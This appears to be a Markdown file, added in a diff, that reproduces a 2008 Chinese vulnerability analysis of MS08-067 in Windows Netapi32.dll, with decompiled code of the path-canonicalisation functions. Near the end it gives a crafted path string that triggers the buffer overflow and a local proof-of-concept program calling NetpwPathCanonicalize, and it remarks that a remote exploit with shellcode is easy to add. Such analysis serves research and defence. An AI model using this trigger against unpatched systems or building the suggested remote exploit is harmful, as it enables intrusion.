@@ -1,0 +1,191 @@
+
+# MS08-067 漏洞分析（20081025）
+
+> 原文：[`www.pediy.com/kssd/pediy10/75361.html`](https://www.pediy.com/kssd/pediy10/75361.html)
+
+前天看到微软紧急发布了一个漏洞补丁，就去看了下，发现该漏洞影响覆盖面非常广，包括 Windows 2000/XP/2003/Vista/2008 的各个版本，甚至还包括测试阶段的 Windows 7 Pre-Beta，并且漏洞存在于 Windows 系统默认开启的 Server 服务当中，而且超越了当年风靡一时的 MS06-040 漏洞（又想起当年用该漏洞。。。。。。。嘿嘿）。这也难怪微软打破周二发布补丁的惯例。于是下了补丁研究研究。
+
+下完补丁，发现被打补丁的又是 `Netapi32.dll`，对比原文件和补丁中的文件，有问题的函数又是 `NetpwPathCanonicalize`（MS06-040 也是这个函数，具体信息请搜索）简单说下这个函数：
+
+该函数用于标准化一个路径，一般用于本地调用，若调用者指定了一个远程计算机名将会使用 RPC。
+
+该函数能够处理的路径类型：
+
+1. 相对路径 e.g. `foo\\bar`
+2. 绝对路径 e.g. `\\foo\\bar`
+3. UNC 路径 e.g. `\\\\computer\\share\\foo`
+4. 全路径 e.g. `d:\\foo\\bar`
+
+该函数声明如下：
+
+`DWORD`
+
+`NetpwPathCanonicalize(`
+
+`LPWSTR PathName, //需要标准化的路径`
+
+`LPWSTR Outbuf, //存储标准化后的路径的 Buffer`
+
+`DWORD OutbufLen, //Buffer 长度`
+
+`LPWSTR Prefix, //可选参数，当 PathName 是相对路径时有用`
+
+`LPDWORD PathType, //存储路径类型`
+
+`DWORD Flags // 保留，为 0`
+
+`)`
+
+该函数中在一个循环里使用 `wcscpy`，恶意攻击者通过构造一个精心设计的路径将使漏洞触发。
+
+结合 IDA 分析该函数：(F5 + 整理 + 主要代码)
+
+代码:
+```
+int __stdcall NetpwPathCanonicalize(LPWSTR PathName, LPWSTR Outbuf, DWORD OutbufLen, LPWSTR Prefix, LPDWORD PathType, DWORD Flags)
+{
+  bool v7; 
+  int result;
+
+  v7 = !Prefix || !*Prefix;
+  Prefix = (LPWSTR)*PathType;
+
+    if ( *PathType || (result = NetpwPathType(PathName, (int)&Prefix, 0), !result) )
+    {
+      if ( v7 || (result = NetpwPathType(Prefix, (int)&Flags, 0), !result) )
+      {
+        if ( OutbufLen != 0 )
+        {
+          *Outbuf = 0;
+          result = CanonPathName(Prefix, PathName, Outbuf, OutbufLen, 0); //核心函数，主要处理在这里，问题也出在这里
+          if ( !result )
+            result = NetpwPathType(Outbuf, (int)PathType, 0);
+        }
+        else
+        {
+          result = 2123;
+        }
+      }
+    }
+
+  return result;
+}
+
+int __stdcall CanonPathName(LPWSTR PathPrefix, LPWSTR PathName, LPWSTR Buffer, DWORD BufferSize, LPDWORD RetSize)
+{
+  size_t preLen;
+  size_t pathLen;
+  wchar_t pathBuffer[MAX_PATH*2 + 1];
+
+  if ( PathPrefix && *PathPrefix )
+  {
+    preLen = wcslen(PathPrefix);
+    if ( preLen != 0)
+    {
+      if ( preLen > 520 ) //520 = sizeof(pathBuffer) - 1
+        return 0x7Bu; // ERROR_INVALID_NAME
+         
+      wcscpy(pathBuffer, PathPrefix);
+      
+      if ( pathBuffer[preLen-1] != '\\\\' && pathBuffer[preLen-1] != '/' ) //判断前缀是否以'\\'或'/'结尾
+      {
+          wcscat(pathBuffer, L"\\\\");
+          ++preLen;
+      }
+      if ( PathName[0] == '\\\\' || PathName[0] == '/' )
+        ++pathLen;
+    }
+  }
+  else
+  {
+    pathBuffer[0] = 0;
+  }
+  pathLen = wcslen(PathName);
+
+  if (pathLen + preLen > sizeof(pathBuffer) - 1)
+    return 0x7Bu; // ERROR_INVALID_NAME
+
+  wcscat(pathBuffer, PathName);
+
+  if ( pathBuffer )
+  {
+    do //该循环把路径中的'/'转换成'\\'
+    {
+      if ( *pathBuffer == '/' )
+        *pathBuffer = '\\\\';
+      ++pathBuffer;
+    }
+    while ( *pathBuffer );
+  }
+  if ( !sub_71C4A2CA() && !ConPathMacros(pathBuffer) ) //ConPathMacros 中存在缓冲区溢出漏洞！！！
+    return 0x7Bu;
+  pathLen = 2 * wcslen(&pathBuffer) + 2;
+  if ( pathLen > BufferSize )
+  {
+    if ( RetSize )
+      *RetSize = pathLen;
+    result = 0x84Bu; 
+  }
+  else
+  {
+    wcscpy(Buffer, &pathBuffer);
+    result = 0;
+  }
+  return result;
+}
+```
+
+函数 `ConPathMacros` 在附件中可以找到。
+
+在测试时大家可以把函数 `ConPathMacros` 单独提取出来，传入一个路径，看其是怎样去掉路径中的`\\..`和`\\.`宏
+
+构造恶意路径：
+
+形如`".\\\\\\x\\\\..\\\\..\\\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"`即可导致函数 `ConPathMacros` 漏洞的触发
+
+看图中的局部变量：
+
+![](img/ff9ac5e04af7f51f1f1eecc676e3d4fc.jpg)
+
+本地溢出 `Netapi32.dll`：
+
+代码:
+```
+int main(int argc, char* argv[])
+{
+    WCHAR szBuffer[] = L".\\\\\\x\\\\..\\\\..\\\\aaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+
+    //ConvertPathMacros(szBuffer);
+    //printf("%S\\n", szBuffer);
+
+    HMODULE h = LoadLibrary("netapi32.dll");
+    if(h != NULL)
+    {
+        NetpwPathCanonicalize = (pNetpwPathCanonicalize)GetProcAddress(h, "NetpwPathCanonicalize");
+        if(NetpwPathCanonicalize != NULL)
+        {
+            WCHAR Buffer[256] = L"";
+            DWORD type = 1000; //不能为 0，否则构造的路径过不了 NetpwPathType 的检查
+            DWORD ret = NetpwPathCanonicalize(szBuffer, Buffer, 512, NULL, &type, 0);
+            printf("ret = %x\\n", ret);
+            printf("%S\\n", Buffer);
+        }
+        FreeLibrary(h);
+    }
+    return 0;
+}
+```
+
+漏洞的源头找到了，加个 shellcode 写个 Remote Exploit 不难。。。况且可以参考 MS06-040,
+
+手工实现 RPC 通信等等。。。
+
+Bulletin:
+
+[`www.microsoft.com/technet/sec.../MS08-067.mspx`](http://www.microsoft.com/technet/security/Bulletin/MS08-067.mspx)
+
+上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || MS08067.rar  
+
+|
